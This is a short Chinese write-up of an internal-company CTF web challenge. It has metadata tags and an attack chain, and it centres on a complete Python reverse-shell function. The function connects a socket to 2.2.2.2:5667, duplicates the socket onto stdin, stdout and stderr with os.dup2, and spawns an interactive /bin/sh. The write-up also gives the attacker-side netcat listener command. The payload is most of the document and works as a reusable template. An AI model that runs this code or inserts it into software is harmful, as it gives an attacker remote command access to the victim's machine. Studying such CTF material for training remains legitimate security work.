---
title: 公司内部 CTF 初赛 Web 题 - Python 反连 shell
contest: 内部CTF
year: 2023
difficulty: easy
vuln_type: web_unknown
tags: [Python, reverse-shell, os.dup2, subprocess.call, /bin/sh, socket, internal-CTF, web-RCE]
attack_chain:
  - 注入代码: def test(args={}):
  - 导入 socket, subprocess, os
  - 创建 socket s = socket.socket(AF_INET, SOCK_STREAM)
  - 连攻击者 s.connect(("2.2.2.2", 5667))
  - dup2 重定向 stdin/stdout/stderr: os.dup2(s.fileno(), 0/1/2)
  - 启动 /bin/sh -i
  - 攻击者监听: nc -lvnp 5667
  - 拿到反弹 shell
key_payload: 'os.dup2(s.fileno(), 0/1/2) + subprocess.call(["/bin/sh","-i"])'
one_liner: 公司内部 CTF 入门 Web 题：Python 反连 shell 三件套 socket + dup2 + /bin/sh -i。
lesson: dup2 重定向 fd 是 *nix 反连 shell 的标准三件套，Python subprocess + os.dup2 配合简洁。
quality: low
---

# 公司内部 CTF 的初赛 web 题

**来源**: ctfiot.com ID 91551

## 攻击代码

```python
def test(args={}):
    import socket
    import subprocess
    import os
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(("2.2.2.2", 5667))
    os.dup2(s.fileno(), 0)
    os.dup2(s.fileno(), 1)
    os.dup2(s.fileno(), 2)
    p = subprocess.call(["/bin/sh", "-i"])
    return "ok"
```

## 解题步骤

### 攻击端
```bash
nc -lvnp 5667
```

### 漏洞端
- 在某个可注入点执行 `test()` 函数
- 反弹 shell 回连 2.2.2.2:5667

## 技术点
- **socket 创建 TCP 连接**
- **os.dup2** 把 socket fd 复制到 stdin(0) / stdout(1) / stderr(2)
- **subprocess.call(["/bin/sh","-i"])** 启动交互 shell
- 三件套让 shell 的输入输出都走 socket

## 评价
入门级内部 CTF Web 题。Python 反连 shell 模板，考察 socket + dup2 + subprocess 三件套基本功。适合作为 Python 安全入门案例。
